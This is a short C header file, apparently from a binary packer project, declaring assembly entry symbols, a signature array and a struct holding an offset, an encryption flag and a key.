#ifndef FAMINE_H
# define FAMINE_H

#include <stddef.h>
#include <stdint.h>
#include "data.h"

/* ASM functions/variables */
extern void packer_start();
extern void packer_end();
extern void jmp_rel();
extern char sign[SIGNATURE_SIZE];

typedef struct saved_vars_s {
	int start_offset;
	bool is_encrypted;
	uint8_t key[KEY_SIZE];
} saved_vars_t;

#endif
